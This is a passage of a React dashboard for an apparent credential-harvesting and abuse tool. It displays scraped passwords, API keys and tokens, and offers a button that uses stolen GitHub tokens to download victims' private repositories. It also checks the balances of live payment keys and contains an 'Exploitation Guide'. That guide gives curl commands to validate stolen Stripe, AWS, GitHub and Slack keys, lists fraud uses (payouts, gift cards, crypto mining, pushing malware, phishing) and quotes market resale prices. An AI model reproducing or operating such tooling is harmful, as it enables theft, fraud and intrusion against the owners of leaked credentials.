                      const response = await fetch(`${API_URL}/api/exploit/clone-github`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
                        body: JSON.stringify({ credentials: githubTokens })
                      });
                      const data = await response.json();
                      if (data.success) {
                        setExploitResults({ type: 'github', data });
                        alert(`Scanned ${data.checked} tokens\n\nActive: ${data.summary.active}\nTotal Private Repos: ${data.summary.totalRepos}`);
                      }
                    } catch (error) {
                      alert('Clone failed: ' + error.message);
                    } finally {
                      btn.disabled = false;
                      btn.textContent = `Clone Repos (${githubTokens.length})`;
                    }
                  }}
                  className="w-full bg-pink-600 hover:bg-pink-700 text-white py-3 rounded-lg font-semibold transition disabled:bg-gray-600"
                >
                  Clone Repos ({results.filter(r => r.credential_type === 'github_token').length})
                </button>
                <div className="mt-3 text-xs text-gray-400">
                  Auto-downloads all private repositories
                </div>
              </div>
            </div>

            {/* Results Display */}
            {exploitResults && (
              <div className="mt-6 bg-gray-900 rounded-xl p-6 border border-green-500">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-white font-bold text-lg">📊 Results</h3>
                  <button onClick={() => setExploitResults(null)} className="text-gray-400 hover:text-white">✕</button>
                </div>

                {exploitResults.type === 'balance' && (
                  <div className="space-y-3">
                    <div className="bg-green-900/30 border border-green-500 rounded-lg p-4">
                      <div className="text-green-400 font-bold text-3xl">${exploitResults.data.summary.totalValue.toFixed(2)}</div>
                      <div className="text-gray-300">Total Balance Available</div>
                    </div>
                    <div className="grid grid-cols-3 gap-3">
                      <div className="bg-gray-800 p-3 rounded-lg text-center">
                        <div className="text-green-400 font-bold text-2xl">{exploitResults.data.summary.live}</div>
                        <div className="text-gray-400 text-sm">LIVE</div>
                      </div>
                      <div className="bg-gray-800 p-3 rounded-lg text-center">
                        <div className="text-red-400 font-bold text-2xl">{exploitResults.data.summary.dead}</div>
                        <div className="text-gray-400 text-sm">DEAD</div>
                      </div>
                      <div className="bg-gray-800 p-3 rounded-lg text-center">
                        <div className="text-blue-400 font-bold text-2xl">{exploitResults.data.checked}</div>
                        <div className="text-gray-400 text-sm">CHECKED</div>
                      </div>
                    </div>
                    <div className="max-h-96 overflow-y-auto space-y-2">
                      {exploitResults.data.results.map((r, i) => (
                        <div key={i} className={`p-4 rounded-lg ${r.status === 'LIVE' ? 'bg-green-900/30 border border-green-500' : 'bg-gray-800'}`}>
                          <div className="flex items-center justify-between">
                            <div className="flex-1">
                              <div className="text-white font-mono text-sm">{r.key}</div>
                              {r.source && <div className="text-gray-400 text-xs mt-1">{r.source}</div>}
                            </div>
                            <div className="text-right">
                              <div className={`font-bold text-lg ${r.status === 'LIVE' ? 'text-green-400' : 'text-red-400'}`}>{r.status}</div>
                              {r.balance !== undefined && <div className="text-green-400 font-bold text-xl">${r.balance.toFixed(2)}</div>}
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {exploitResults.type === 'test' && (
                  <div className="space-y-3">
                    <div className="grid grid-cols-4 gap-3">
                      <div className="bg-green-900/30 p-3 rounded-lg text-center">
                        <div className="text-green-400 font-bold text-xl">{exploitResults.data.summary.live}</div>
                        <div className="text-gray-400 text-xs">LIVE</div>
                      </div>
                      <div className="bg-red-900/30 p-3 rounded-lg text-center">
                        <div className="text-red-400 font-bold text-xl">{exploitResults.data.summary.dead}</div>
                        <div className="text-gray-400 text-xs">DEAD</div>
                      </div>
                      <div className="bg-blue-900/30 p-3 rounded-lg text-center">
                        <div className="text-blue-400 font-bold text-xl">{exploitResults.data.summary.active}</div>
                        <div className="text-gray-400 text-xs">ACTIVE</div>
                      </div>
                      <div className="bg-gray-800 p-3 rounded-lg text-center">
                        <div className="text-white font-bold text-xl">{exploitResults.data.tested}</div>
                        <div className="text-gray-400 text-xs">TESTED</div>
                      </div>
                    </div>
                  </div>
                )}

                {exploitResults.type === 'github' && (
                  <div className="space-y-3">
                    <div className="grid grid-cols-2 gap-3">
                      <div className="bg-green-900/30 p-4 rounded-lg text-center">
                        <div className="text-green-400 font-bold text-2xl">{exploitResults.data.summary.active}</div>
                        <div className="text-gray-300">Active Tokens</div>
                      </div>
                      <div className="bg-blue-900/30 p-4 rounded-lg text-center">
                        <div className="text-blue-400 font-bold text-2xl">{exploitResults.data.summary.totalRepos}</div>
                        <div className="text-gray-300">Private Repos</div>
                      </div>
                    </div>
                    <div className="max-h-96 overflow-y-auto space-y-2">
                      {exploitResults.data.results.map((r, i) => (
                        <div key={i} className="bg-gray-800 p-4 rounded-lg">
                          <div className="flex items-center justify-between mb-2">
                            <div className="text-white font-bold text-lg">{r.username}</div>
                            <div className={`font-bold ${r.status === 'ACTIVE' ? 'text-green-400' : 'text-red-400'}`}>{r.status}</div>
                          </div>
                          {r.repos && (
                            <div className="text-sm text-gray-400">{r.privateRepos} private repos found</div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* Exploitation Guide */}
            <div className="mt-6 bg-gray-900 rounded-xl p-6 border border-gray-700">
              <h3 className="text-white font-bold text-lg mb-4">📚 Exploitation Guide</h3>
              <div className="space-y-4">
                <div className="bg-gray-800 p-4 rounded-lg">
                  <div className="text-green-400 font-bold mb-2">💰 Stripe Keys (sk_live_...)</div>
                  <div className="text-sm text-gray-300 space-y-1">
                    <div><strong>Test:</strong> <code className="bg-gray-900 px-2 py-1 rounded text-xs">curl https://api.stripe.com/v1/balance -u sk_live_XXX:</code></div>
                    <div><strong>Use:</strong> Create payouts, refunds, or purchase gift cards via API</div>
                    <div><strong>Value:</strong> $500-$2000 per key</div>
                  </div>
                </div>
                <div className="bg-gray-800 p-4 rounded-lg">
                  <div className="text-blue-400 font-bold mb-2">☁️ AWS Keys (AKIA...)</div>
                  <div className="text-sm text-gray-300 space-y-1">
                    <div><strong>Test:</strong> <code className="bg-gray-900 px-2 py-1 rounded text-xs">aws sts get-caller-identity</code></div>
                    <div><strong>Use:</strong> Launch EC2 for crypto mining, download S3 data, create resources</div>
                    <div><strong>Value:</strong> $300-$1000 per key</div>
                  </div>
                </div>
                <div className="bg-gray-800 p-4 rounded-lg">
                  <div className="text-purple-400 font-bold mb-2">🔑 GitHub Tokens (ghp_...)</div>
                  <div className="text-sm text-gray-300 space-y-1">
                    <div><strong>Test:</strong> <code className="bg-gray-900 px-2 py-1 rounded text-xs">curl -H "Authorization: token ghp_XXX" https://api.github.com/user</code></div>
                    <div><strong>Use:</strong> Clone private repos, read secrets, push malware</div>
                    <div><strong>Value:</strong> $50-$200 per token</div>
                  </div>
                </div>
                <div className="bg-gray-800 p-4 rounded-lg">
                  <div className="text-yellow-400 font-bold mb-2">💬 Slack Tokens (xoxb-...)</div>
                  <div className="text-sm text-gray-300 space-y-1">
                    <div><strong>Test:</strong> <code className="bg-gray-900 px-2 py-1 rounded text-xs">curl -H "Authorization: Bearer xoxb-XXX" https://slack.com/api/auth.test</code></div>
                    <div><strong>Use:</strong> Read messages, download files, phish users</div>
                    <div><strong>Value:</strong> $100-$500 per token</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Critical Tab */}
        {activeTab === 'critical' && (
          <div className="bg-red-900/20 rounded-2xl p-6 border border-red-500">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-2xl font-bold text-red-400">🔥 CRITICAL ONLY ({results.filter(r => r.severity === 'critical').length})</h2>
              {results.filter(r => r.severity === 'critical').length > 0 && (
                <div className="flex gap-2">
                  <button onClick={() => {
                    const critical = results.filter(r => r.severity === 'critical');
                    const dataStr = JSON.stringify(critical, null, 2);
                    const blob = new Blob([dataStr], { type: 'application/json' });
                    const url = URL.createObjectURL(blob);
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = `CRITICAL-${Date.now()}.json`;
                    link.click();
                  }} className="flex items-center gap-2 px-3 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg transition text-sm">
                    <Download className="w-4 h-4" />CRITICAL JSON
                  </button>
                </div>
              )}
            </div>

            {results.filter(r => r.severity === 'critical').length === 0 ? (
              <div className="text-center py-12 text-gray-400">
                <CheckCircle className="w-16 h-16 mx-auto mb-4 text-green-500" />
                <p>No critical vulnerabilities found</p>
              </div>
            ) : (
              <div className="space-y-3 max-h-[600px] overflow-y-auto">
                {results.filter(r => r.severity === 'critical').map((result, index) => (
                  <div key={index} className="p-4 rounded-lg border bg-red-900/30 border-red-500">
                    <div className="flex items-start justify-between mb-2">
                      <div className="flex-1">
                        <div className="flex items-center gap-2 mb-2">
                          <span className="px-2 py-1 rounded text-xs font-semibold bg-red-600 text-white animate-pulse">CRITICAL</span>
                          <span className="text-red-400 text-sm font-semibold">{result.source}</span>
                          <span className="text-gray-300 text-sm">{result.credential_type}</span>
                        </div>
                        <div className="text-white text-sm space-y-1">
                          {result.email && <div>📧 <span className="text-yellow-300 font-mono">{result.email}</span></div>}
                          {result.password && <div>🔑 <span className="text-green-300 font-mono text-lg">{result.password}</span></div>}
                          {result.api_key && <div>🔐 <span className="text-yellow-300 font-mono break-all">{result.api_key}</span></div>}
                          {result.token && <div>🎫 <span className="text-blue-300 font-mono break-all">{result.token}</span></div>}
                        </div>
                        {result.url && <a href={result.url} target="_blank" className="text-xs text-purple-400 hover:underline mt-2 block">🔗 {result.url}</a>}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Results Tab */}
        {activeTab === 'results' && (
          <div className="bg-gray-800 rounded-2xl p-6 border border-purple-500/30">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-2xl font-bold text-white">Scan Results ({results.length})</h2>
              {results.length > 0 && (
                <div className="flex gap-2">
                  <button onClick={exportJSON} className="flex items-center gap-2 px-3 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition text-sm">
                    <Download className="w-4 h-4" />JSON
                  </button>
                  <button onClick={exportCSV} className="flex items-center gap-2 px-3 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg transition text-sm">
                    <Download className="w-4 h-4" />CSV
                  </button>
                  <button onClick={exportPDF} className="flex items-center gap-2 px-3 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg transition text-sm">
                    <Download className="w-4 h-4" />PDF
                  </button>
                </div>
              )}
            </div>

            {results.length === 0 ? (
              <div className="text-center py-12 text-gray-400">
                <Search className="w-16 h-16 mx-auto mb-4 opacity-50" />
                <p>No results yet. Start a scan to find credentials.</p>
              </div>
            ) : (
              <div className="space-y-3 max-h-[600px] overflow-y-auto">
                {results.map((result, index) => (
                  <div
                    key={index}
                    className={`p-4 rounded-lg border ${
                      result.severity === 'critical'
                        ? 'bg-red-900/20 border-red-500/50'
                        : result.severity === 'high'
                        ? 'bg-orange-900/20 border-orange-500/50'
                        : 'bg-gray-700 border-gray-600'
                    }`}
                  >
                    <div className="flex items-start justify-between mb-2">
                      <div className="flex-1">
                        <div className="flex items-center gap-2 mb-2 flex-wrap">
                          <span className={`px-2 py-1 rounded text-xs font-semibold ${
                            result.severity === 'critical'
                              ? 'bg-red-600 text-white'
                              : result.severity === 'high'
                              ? 'bg-orange-600 text-white'
                              : 'bg-yellow-600 text-white'
                          }`}>
                            {result.severity?.toUpperCase()}
                          </span>
                          <span className="text-purple-400 text-sm font-semibold">{result.source}</span>
                          <span className="text-gray-400 text-sm">{result.credential_type}</span>
                          {result.category && (
                            <span className={`px-2 py-1 rounded text-xs font-semibold ${
                              result.category === 'financial' ? 'bg-green-600 text-white' :
                              result.category === 'cloud_access' ? 'bg-blue-600 text-white' :
                              result.category === 'api_abuse' ? 'bg-purple-600 text-white' :
                              result.category === 'account_access' ? 'bg-yellow-600 text-white' :
                              'bg-gray-600 text-white'
                            }`}>
                              {result.category === 'financial' ? '💰 MONEY' :
                               result.category === 'cloud_access' ? '☁️ CLOUD' :
                               result.category === 'api_abuse' ? '🔌 API' :
                               result.category === 'account_access' ? '🔑 LOGIN' :
                               result.category}
                            </span>
                          )}
                        </div>
                        {result.use && (
                          <div className="text-xs text-green-400 mb-2">✅ {result.use}</div>
                        )}
                        {result.price && (
                          <div className="text-xs text-yellow-400 font-bold">💵 Market Price: {result.price}</div>
                        )}
                        {/* Preview */}
                        <div className="text-white text-sm">
                          {result.email && <span>📧 {result.email}</span>}
                          {result.username && <span>👤 {result.username}</span>}
                          {result.password && <span>🔑 Password: {result.password.substring(0, 20)}{result.password.length > 20 ? '...' : ''}</span>}
                          {result.api_key && <span>🔐 API Key: {result.api_key.substring(0, 30)}...</span>}
                          {result.token && <span>🎫 Token: {result.token.substring(0, 30)}...</span>}
                        </div>
                        {result.repository && <div className="text-xs text-gray-400 mt-1">📁 {result.repository}</div>}
                      </div>
                      <button
                        onClick={() => setSelectedResult(selectedResult === index ? null : index)}
                        className="text-purple-400 hover:text-purple-300 ml-2"
                      >
                        <Eye className="w-5 h-5" />
                      </button>
                    </div>

                    {selectedResult === index && (
                      <div className="mt-3 p-4 bg-gray-900 rounded border border-gray-700">
                        <div className="grid grid-cols-1 gap-3">
                          {result.email && (
                            <div className="bg-gray-800 p-3 rounded">
                              <div className="text-gray-400 text-xs mb-1">EMAIL</div>
                              <div className="text-white font-mono">{result.email}</div>
                            </div>
                          )}
                          {result.username && (
                            <div className="bg-gray-800 p-3 rounded">
                              <div className="text-gray-400 text-xs mb-1">USERNAME</div>
                              <div className="text-white font-mono">{result.username}</div>
                            </div>
                          )}
                          {result.password && (
                            <div className="bg-gray-800 p-3 rounded">
                              <div className="text-gray-400 text-xs mb-1">PASSWORD</div>
                              <div className="text-green-400 font-mono text-lg">{result.password}</div>
                            </div>
                          )}
                          {result.api_key && (
                            <div className="bg-gray-800 p-3 rounded">
                              <div className="text-gray-400 text-xs mb-1">API KEY</div>
                              <div className="text-yellow-400 font-mono text-xs break-all">{result.api_key}</div>
                            </div>
                          )}
                          {result.token && (
                            <div className="bg-gray-800 p-3 rounded">
                              <div className="text-gray-400 text-xs mb-1">TOKEN</div>
                              <div className="text-blue-400 font-mono text-xs break-all">{result.token}</div>
                            </div>
                          )}
                          {result.url && (
                            <div className="bg-gray-800 p-3 rounded">
                              <div className="text-gray-400 text-xs mb-1">SOURCE URL</div>
                              <a href={result.url} target="_blank" className="text-purple-400 hover:underline text-xs break-all">{result.url}</a>
                            </div>
                          )}
                          {result.raw_data && (
                            <div className="bg-gray-800 p-3 rounded">
                              <div className="text-gray-400 text-xs mb-1">RAW DATA</div>
                              <pre className="text-white text-xs overflow-x-auto">{result.raw_data}</pre>
                            </div>
                          )}
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* History Tab */}
        {activeTab === 'history' && (
          <div className="bg-gray-800 rounded-2xl p-6 border border-purple-500/30">
            <h2 className="text-2xl font-bold text-white mb-4">Scan History</h2>
            
            {recentScans.length === 0 ? (
              <div className="text-center py-12 text-gray-400">
                <Database className="w-16 h-16 mx-auto mb-4 opacity-50" />
                <p>No scan history yet.</p>
              </div>
            ) : (
              <div className="space-y-3">
                {recentScans.map((scan) => (
                  <div key={scan.id} className="p-4 bg-gray-700 rounded-lg border border-gray-600">
                    <div className="flex items-center justify-between">
                      <div>
                        <div className="text-white font-semibold">{scan.search_input}</div>
                        <div className="text-sm text-gray-400">
                          Type: {scan.search_type} • Results: {scan.results_count} • {new Date(scan.started_at).toLocaleString()}
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className={`px-3 py-1 rounded text-sm font-semibold ${
                          scan.status === 'completed'
                            ? 'bg-green-600 text-white'
                            : scan.status === 'failed'
                            ? 'bg-red-600 text-white'
                            : 'bg-yellow-600 text-white'
                        }`}>
                          {scan.status}
                        </span>
                        {scan.status === 'running' && (
                          <button
                            onClick={async () => {
                              if (confirm('Stop this scan?')) {
                                try {
                                  const response = await fetch(`${API_URL}/scraper/stop/${scan.id}`, {
                                    method: 'POST',
                                    headers: { 'x-admin-key': adminKey }
                                  });
                                  const data = await response.json();
                                  if (data.success) {
                                    alert('Scan stopped!');
                                    loadRecentScans();
                                  }
                                } catch (error) {
                                  alert('Failed to stop scan');
                                }
                              }
                            }}
                            className="px-3 py-1 bg-red-600 hover:bg-red-700 text-white rounded text-sm transition flex items-center gap-1"
                          >
                            <XCircle className="w-4 h-4" />
                            Stop
                          </button>
                        )}
                        {scan.status === 'completed' && scan.results_count > 0 && (
                          <button
                            onClick={() => viewScanResults(scan.id)}
                            className="px-3 py-1 bg-purple-600 hover:bg-purple-700 text-white rounded text-sm transition"
                          >
                            View
                          </button>
                        )}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Database Tab */}
        {activeTab === 'database' && (
          <div className="bg-gray-800 rounded-2xl p-6 border border-purple-500/30">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-2xl font-bold text-white">All Credentials ({allCredentials.length})</h2>
              <button
                onClick={async () => {
                  try {
                    const response = await fetch(`${API_URL}/scraper/duplicates`, {
                      headers: { 'x-admin-key': adminKey }
                    });
                    const data = await response.json();
                    if (data.success) {
                      if (data.totalDuplicates === 0) {
                        alert('No duplicates found! Database is clean.');
                      } else {
                        const confirmed = confirm(`Found ${data.totalDuplicates} duplicate credentials in ${data.duplicateGroups} groups.\n\nDelete all duplicates? (Keeps oldest entry)`);
                        if (confirmed) {
                          const deleteResponse = await fetch(`${API_URL}/scraper/delete-duplicates`, {
                            method: 'POST',
                            headers: { 'x-admin-key': adminKey }
                          });
                          const deleteData = await deleteResponse.json();
                          if (deleteData.success) {
                            alert(`Deleted ${deleteData.deleted} duplicates!`);
                            loadStats();
                            loadAllCredentials();
                          }
                        }
                      }
                    }
                  } catch (error) {
                    alert('Failed: ' + error.message);
                  }
                }}
                className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-semibold transition flex items-center gap-2"
              >
                <Trash2 className="w-4 h-4" />
                Clean Duplicates
              </button>
            </div>
            
            {allCredentials.length === 0 ? (
              <div className="text-center py-12 text-gray-400">
                <Database className="w-16 h-16 mx-auto mb-4 opacity-50" />
                <p>No credentials in database yet.</p>
              </div>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {allCredentials.map((cred) => (
                  <div key={cred.id} className="p-3 bg-gray-700 rounded-lg border border-gray-600 flex items-center justify-between">
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-1">
                        <span className="text-purple-400 text-sm font-semibold">{cred.source}</span>
                        <span className="text-gray-400 text-sm">{cred.credential_type}</span>
                        <span className={`px-2 py-0.5 rounded text-xs ${
                          cred.severity === 'critical' ? 'bg-red-600' : cred.severity === 'high' ? 'bg-orange-600' : 'bg-yellow-600'
                        } text-white`}>
                          {cred.severity}
                        </span>
                      </div>
                      <div className="text-white text-sm">
                        {cred.email || cred.username || cred.api_key?.substring(0, 20) + '...' || 'View details'}
                      </div>
                    </div>
                    <button
                      onClick={() => deleteCredential(cred.id)}
                      className="text-red-400 hover:text-red-300 p-2"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
